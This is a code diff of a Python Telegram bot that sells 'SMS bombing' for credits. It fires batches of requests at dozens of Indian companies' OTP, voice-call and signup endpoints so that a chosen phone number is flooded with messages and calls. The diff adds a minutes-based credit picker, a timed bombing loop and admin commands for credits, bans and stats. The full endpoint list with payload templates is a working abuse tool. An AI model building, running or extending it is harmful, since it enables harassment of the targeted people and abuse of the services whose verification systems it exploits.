@@ -26,7 +26,7 @@ BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT        = int(os.environ.get("PORT", 8000))
 
-# ⚠️ APNI TELEGRAM ID YAHAN DAALEIN (Admin Panel access ke liye)
+# ⚠️ AAPKI TELEGRAM ID
 ADMIN_ID = 8959878185  
 
 # ULTRA FAST MODE
@@ -63,7 +63,7 @@ def save_db():
 def get_user(uid):
     uid_str = str(uid)
     if uid_str not in user_sessions:
-        user_sessions[uid_str] = {"credits": 0, "banned": False, "total_sent": 0}
+        user_sessions[uid_str] = {"credits": 0, "banned": False}
         save_db()
     return user_sessions[uid_str]
 
@@ -82,13 +82,11 @@ def is_valid_target(num: str) -> bool:
     return num.isdigit() and len(num) == 10 and num[0] in "6789"
 
 # =========================================================================
-#  ULTIMATE APIS (Same as before)
+#  APIS (Same as before)
 # =========================================================================
 def build_endpoints():
     UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
-    UA_C2 = "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
     E = []
-
     E.append({"name":"Swiggy_Call","method":"POST","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","headers":{"Content-Type":"application/json","User-Agent":UA_D,"Origin":"https://www.swiggy.com"},"data":'{"mobile":"{t}"}'})
     E.append({"name":"TataCapital_Voice","method":"POST","url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","isOtpViaCallAtLogin":"true"}'})
     E.append({"name":"1MG_Call","method":"POST","url":"https://www.1mg.com/auth_api/v6/create_token","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"number":"{t}","otp_on_call":true}'})
@@ -166,7 +164,6 @@ def build_endpoints():
     E.append({"name":"PVR","method":"POST","url":"https://www.pvrcinemas.com/api/v2/sendOtp","headers":{"Content-Type":"application/json"},"data":'{"phone":"{t}"}'})
     E.append({"name":"Voot_CheckUser","method":"POST","url":"https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"type":"mobile","mobile":"{t}","countryCode":"+91"}'})
     E.append({"name":"MedPlus_Register","method":"POST","url":"https://mobile.medplusindia.com/mobilemvc/profile/register.mbl","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"recieveUpdates=1&mobileNumber={t}"})
-    E.append({"name":"Netmeds_Details","method":"GET","url":"https://m.netmeds.com/mst/rest/v1/id/details/{t}","headers":{"User-Agent":UA_D},"data":None})
     E.append({"name":"InstaCash_OTP","method":"POST","url":"https://getinstacash.in/sell/getData.php","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"type=sendOTP&mobile={t}"})
     E.append({"name":"Snapdeal_Signup","method":"POST","url":"https://m.snapdeal.com/signupCompleteAjax","headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA_D},"data":"j_mobilenumber={t}&agree=true&journey=mobile&swp=true"})
     E.append({"name":"Cuemath_Parent","method":"POST","url":"https://www.cuemath.com/api/v4/parents/","headers":{"Content-Type":"application/json","User-Agent":UA_D},"data":'{"phone":"{t}","email":"","full_name":"","place_id":""}'})
@@ -250,31 +247,6 @@ async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
 
-# ================== ADMIN PANEL ==================
-async def admin_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if uid != ADMIN_ID:
-        return await update.message.reply_text("❌ You are not authorized.")
-
-    keyboard = [
-        [InlineKeyboardButton("SEND SMS", callback_data="admin_sms"), InlineKeyboardButton("MANAGE FIREBASE", callback_data="admin_firebase")],
-        [InlineKeyboardButton("MANAGE VIDEOS", callback_data="admin_videos"), InlineKeyboardButton("MANAGE SUPER ADMINS", callback_data="admin_superadmins")],
-        [InlineKeyboardButton("MANAGE ADMINS", callback_data="admin_admins"), InlineKeyboardButton("VIEW USERS", callback_data="admin_users")],
-        [InlineKeyboardButton("BAN USER", callback_data="admin_ban"), InlineKeyboardButton("UNBAN USER", callback_data="admin_unban")],
-        [InlineKeyboardButton("BROADCAST", callback_data="admin_broadcast"), InlineKeyboardButton("API STATS", callback_data="admin_stats")],
-        [InlineKeyboardButton("ACTIVITI LOG", callback_data="admin_log"), InlineKeyboardButton("PRICING PLANS", callback_data="admin_pricing")],
-        [InlineKeyboardButton("REDEEM CODES", callback_data="admin_redeem"), InlineKeyboardButton("ADD CREDITS", callback_data="admin_addcredits")],
-        [InlineKeyboardButton("DEDUCT CREDITS", callback_data="admin_deductcredits"), InlineKeyboardButton("ADD CREDITS ALL", callback_data="admin_addall")],
-        [InlineKeyboardButton("DEDUCT ALL", callback_data="admin_deductall"), InlineKeyboardButton("FORCE JOIN", callback_data="admin_forcejoin")],
-        [InlineKeyboardButton("SETTINGS", callback_data="admin_settings"), InlineKeyboardButton("SMS HISTORY", callback_data="admin_history")],
-        [InlineKeyboardButton("EXPORT SCRIPT", callback_data="admin_export"), InlineKeyboardButton("PROTECT NUMBER", callback_data="admin_protect")],
-        [InlineKeyboardButton("PROTECTED LIST", callback_data="admin_protectedlist"), InlineKeyboardButton("TRACK NUMBER", callback_data="admin_track")],
-        [InlineKeyboardButton("🔴 DISABLE FREE MODE", callback_data="admin_freemode")],
-        [InlineKeyboardButton("REFRESH", callback_data="admin_refresh")]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text("👑 **ADMIN CONTROL PANEL** 👑", reply_markup=reply_markup, parse_mode="Markdown")
-
 async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -297,58 +269,155 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             s["running"] = False
             s["cancelled"] = True
             await query.message.edit_text("🛑 **STOPPING...**", parse_mode="Markdown")
+            
+    elif query.data.startswith("credits_"):
+        # User chose how many credits to use
+        mins = int(query.data.split("_")[1])
+        s = user_sessions.get(str(uid))
+        
+        if user["credits"] < mins:
+            return await query.answer("❌ Not enough credits!", show_alert=True)
+            
+        s["credits_to_use"] = mins
+        s["state"] = "running"
+        
+        keyboard = [[InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bomb")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.message.edit_text(
+            f"💥 **BOMBING STARTED** 💥\n\n"
+            f"🎯 Target: `{s['target']}`\n"
+            f"⏱ Time Limit: `{mins} Minutes`\n"
+            f"⚡ Speed: Ultra Fast\n"
+            f"📡 APIs: {len(ENDPOINTS)}\n",
+            reply_markup=reply_markup,
+            parse_mode="Markdown"
+        )
+        
+        asyncio.create_task(run_bombing(uid, s))
 
-    elif query.data.startswith("admin_"):
-        if uid != ADMIN_ID:
-            return await query.answer("❌ Unauthorized Access!", show_alert=True)
+# ================== TEXT HANDLER & BOMBING ==================
+async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    text = update.message.text.strip()
+    s = user_sessions.get(str(uid))
 
-        action = query.data.replace("admin_", "")
+    if not s or s.get("state") != "awaiting_target":
+        return
 
-        if action == "refresh":
-            await query.answer("✅ Panel Refreshed!", show_alert=True)
-        elif action == "stats":
-            await query.answer(f"📊 Total APIs: {len(ENDPOINTS)}\n👥 Users: {len(user_sessions)}", show_alert=True)
-        elif action == "users":
-            await query.answer(f"👥 Total Users Registered: {len(user_sessions)}", show_alert=True)
-        elif action == "addcredits":
-            await query.message.reply_text("💳 **Format:** `/addcredit <user_id> <amount>`\nExample: `/addcredit 123456789 50`", parse_mode="Markdown")
-        elif action == "deductcredits":
-            await query.message.reply_text("💳 **Format:** `/deductcredit <user_id> <amount>`\nExample: `/deductcredit 123456789 10`", parse_mode="Markdown")
-        elif action == "ban":
-            await query.message.reply_text("🚫 **Format:** `/ban <user_id>`\nExample: `/ban 123456789`", parse_mode="Markdown")
-        elif action == "unban":
-            await query.message.reply_text("✅ **Format:** `/unban <user_id>`\nExample: `/unban 123456789`", parse_mode="Markdown")
-        elif action == "broadcast":
-            await query.message.reply_text("📢 **Format:** `/broadcast <message>`\nExample: `/broadcast Hello Users!`", parse_mode="Markdown")
+    if not is_valid_target(text):
+        return await update.message.reply_text("❌ Invalid. 10 digits starting with 6/7/8/9.")
+
+    user = get_user(uid)
+    if user["credits"] < 1:
+        return await update.message.reply_text("❌ Insufficient Credits!")
+
+    s["target"] = text
+
+    # Ask user how many credits they want to use
+    keyboard = [
+        [InlineKeyboardButton("1 Min (1 Credit)", callback_data="credits_1"), InlineKeyboardButton("5 Min (5 Credits)", callback_data="credits_5")],
+        [InlineKeyboardButton("10 Min (10 Credits)", callback_data="credits_10"), InlineKeyboardButton("30 Min (30 Credits)", callback_data="credits_30")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        f"🎯 Target Locked: `{text}`\n\n"
+        f"💳 Your Credits: `{user['credits']}`\n"
+        f"⏱ **How many minutes do you want to bomb?**\n"
+        f"*(Select the time below)*",
+        reply_markup=reply_markup,
+        parse_mode="Markdown"
+    )
+
+async def run_bombing(uid: int, s: dict):
+    target = s["target"]
+    mins_to_use = s.get("credits_to_use", 1)
+    max_seconds = mins_to_use * 60
+    
+    sent = 0
+    start = time.time()
+    idx = 0
+    
+    # Deduct credits upfront
+    user = get_user(uid)
+    user["credits"] -= mins_to_use
+    save_db()
+
+    try:
+        while s.get("running"):
+            if time.time() - start >= max_seconds:
+                s["time_up"] = True
+                break
+                
+            s["round"] += 1
+            batch = []
+            for _ in range(CONCURRENCY):
+                batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
+                idx += 1
+
+            ok = await _fire_batch(batch, target)
+            sent += ok
+            s["sent"] = sent
+
+            if DELAY > 0:
+                await asyncio.sleep(DELAY)
+            else:
+                await asyncio.sleep(0)
+
+    except Exception as e:
+        logger.exception(f"Bombing error: {e}")
+    finally:
+        s["running"] = False
+
+    try:
+        elapsed = int(time.time() - start)
+        speed = int(sent / elapsed) if elapsed > 0 else 0
+        
+        if s.get("cancelled"):
+            reason = "🛑 **Stopped by you**"
+        elif s.get("time_up"):
+            reason = f"⏰ **{mins_to_use} Minutes Completed!**"
         else:
-            await query.answer(f"⚠️ '{action.upper()}' database required feature.", show_alert=True)
+            reason = "✅ **Finished**"
+            
+        await telegram_app.bot.send_message(
+            uid, 
+            f"{reason}!\n\n"
+            f"🎯 Target: `{target}`\n"
+            f"📨 Total Sent: *{sent}*\n"
+            f"⚡ Speed: *{speed} SMS/sec*\n"
+            f"⏱ Time: {elapsed//60}m {elapsed%60}s\n"
+            f"💳 Credits Left: `{get_user(uid)['credits']}`", 
+            parse_mode="Markdown"
+        )
+    except Exception:
+        pass
 
 # ================== ADMIN COMMANDS ==================
 async def add_credit_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
     try:
-        args = ctx.args
-        target_id = args[0]
-        amount = int(args[1])
+        target_id = ctx.args[0]
+        amount = int(ctx.args[1])
         u = get_user(target_id)
         u["credits"] += amount
         save_db()
         await update.message.reply_text(f"✅ Added `{amount}` credits to `{target_id}`.\nNew Balance: `{u['credits']}`", parse_mode="Markdown")
     except Exception:
-        await update.message.reply_text("❌ Usage: `/addcredit <user_id> <amount>`", parse_mode="Markdown")
+        await update.message.reply_text("❌ Usage: `/add <user_id> <amount>`\nExample: `/add 123456789 50`", parse_mode="Markdown")
 
-async def deduct_credit_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+async def remove_credit_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
     try:
-        args = ctx.args
-        target_id = args[0]
-        amount = int(args[1])
+        target_id = ctx.args[0]
+        amount = int(ctx.args[1])
         u = get_user(target_id)
         u["credits"] = max(0, u["credits"] - amount)
         save_db()
         await update.message.reply_text(f"✅ Deducted `{amount}` credits from `{target_id}`.\nNew Balance: `{u['credits']}`", parse_mode="Markdown")
     except Exception:
-        await update.message.reply_text("❌ Usage: `/deductcredit <user_id> <amount>`", parse_mode="Markdown")
+        await update.message.reply_text("❌ Usage: `/remove <user_id> <amount>`\nExample: `/remove 123456789 10`", parse_mode="Markdown")
 
 async def ban_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
@@ -372,118 +441,24 @@ async def unban_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await update.message.reply_text("❌ Usage: `/unban <user_id>`")
 
-async def broadcast_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+async def admin_help_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID: return
-    if not ctx.args:
-        return await update.message.reply_text("❌ Usage: `/broadcast <message>`")
-    
-    msg = " ".join(ctx.args)
-    count = 0
-    for uid in user_sessions.keys():
-        try:
-            await telegram_app.bot.send_message(int(uid), f"📢 **Broadcast:**\n\n{msg}")
-            count += 1
-        except Exception:
-            pass
-    await update.message.reply_text(f"✅ Broadcast sent to `{count}` users.")
-
-
-# ================== TEXT HANDLER & BOMBING ==================
-async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    text = update.message.text.strip()
-    s = user_sessions.get(str(uid))
-
-    if not s or s.get("state") != "awaiting_target":
-        return
-
-    if not is_valid_target(text):
-        return await update.message.reply_text("❌ Invalid. 10 digits starting with 6/7/8/9.")
-
-    user = get_user(uid)
-    if user["credits"] < 1:
-        return await update.message.reply_text("❌ Insufficient Credits!")
-
-    # Session update
-    s.update(target=text, state="running", running=True, cancelled=False, sent=0, round=0, started_at=time.time())
-
-    keyboard = [[InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bomb")]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-
-    await update.message.reply_text(
-        f"💥 **BOMBING STARTED** 💥\n\n"
-        f"🎯 Target: `{text}`\n"
-        f"💳 Credits: `{user['credits']}` (1 Min = 1 Credit)\n"
-        f"📡 APIs: {len(ENDPOINTS)}\n"
-        f"🔥 **DESTRUCTION STARTED!**",
-        reply_markup=reply_markup,
-        parse_mode="Markdown"
+    text = (
+        "👑 **Admin Commands:**\n\n"
+        "`/add <id> <amount>` - Add credits\n"
+        "`/remove <id> <amount>` - Remove credits\n"
+        "`/ban <id>` - Ban a user\n"
+        "`/unban <id>` - Unban a user\n"
+        "`/stats` - View bot stats\n"
     )
-    asyncio.create_task(run_bombing(uid, s))
+    await update.message.reply_text(text, parse_mode="Markdown")
 
-async def run_bombing(uid: int, s: dict):
-    target = s["target"]
-    sent = 0
-    start = time.time()
-    idx = 0
-    
-    # Credit deduction background task
-    async def deduct_credits():
-        while s.get("running"):
-            await asyncio.sleep(60)
-            user = get_user(uid)
-            if user["credits"] > 0:
-                user["credits"] -= 1
-                user["total_sent"] = user.get("total_sent", 0) + s["sent"]
-                save_db()
-                if user["credits"] <= 0:
-                    s["running"] = False
-                    s["out_of_credits"] = True
-            else:
-                s["running"] = False
-                break
+async def stats_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID: return
+    total_users = len(user_sessions)
+    total_credits = sum(u.get("credits", 0) for u in user_sessions.values() if isinstance(u, dict))
+    await update.message.reply_text(f"📊 **Bot Stats**\n\n👥 Users: `{total_users}`\n💳 Total Credits in System: `{total_credits}`\n📡 APIs Active: `{len(ENDPOINTS)}`", parse_mode="Markdown")
 
-    credit_task = asyncio.create_task(deduct_credits())
-
-    try:
-        while s.get("running"):
-            s["round"] += 1
-            batch = []
-            for _ in range(CONCURRENCY):
-                batch.append(ENDPOINTS[idx % len(ENDPOINTS)])
-                idx += 1
-
-            ok = await _fire_batch(batch, target)
-            sent += ok
-            s["sent"] = sent
-
-            if DELAY > 0:
-                await asyncio.sleep(DELAY)
-            else:
-                await asyncio.sleep(0)
-
-    except Exception as e:
-        logger.exception(f"Bombing error: {e}")
-    finally:
-        s["running"] = False
-        credit_task.cancel()
-
-    try:
-        elapsed = int(time.time() - start)
-        if s.get("cancelled"):
-            reason = "🛑 **Stopped by you**"
-        elif s.get("out_of_credits"):
-            reason = "💳 **Out of Credits!** (Please add credits to continue)"
-        else:
-            reason = "✅ **Finished**"
-            
-        await telegram_app.bot.send_message(
-            uid, 
-            f"{reason}!\n\n🎯 Target: `{target}`\n📨 Total Sent: *{sent}*\n⏱ Time: {elapsed//60}m {elapsed%60}s\n💳 Credits Left: `{get_user(uid)['credits']}`", 
-            parse_mode="Markdown"
-        )
-    except Exception:
-        pass
 
 # ================== STARTUP & WEBHOOK ==================
 async def health(request): return PlainTextResponse("OK", status_code=200)
@@ -500,12 +475,12 @@ async def startup():
     telegram_app = Application.builder().token(BOT_TOKEN).updater(None).build()
     
     telegram_app.add_handler(CommandHandler("start", start_cmd))
-    telegram_app.add_handler(CommandHandler("admin", admin_cmd))
-    telegram_app.add_handler(CommandHandler("addcredit", add_credit_cmd))
-    telegram_app.add_handler(CommandHandler("deductcredit", deduct_credit_cmd))
+    telegram_app.add_handler(CommandHandler("help", admin_help_cmd))
+    telegram_app.add_handler(CommandHandler("add", add_credit_cmd))
+    telegram_app.add_handler(CommandHandler("remove", remove_credit_cmd))
     telegram_app.add_handler(CommandHandler("ban", ban_cmd))
     telegram_app.add_handler(CommandHandler("unban", unban_cmd))
-    telegram_app.add_handler(CommandHandler("broadcast", broadcast_cmd))
+    telegram_app.add_handler(CommandHandler("stats", stats_cmd))
     telegram_app.add_handler(CallbackQueryHandler(button_handler))
     telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
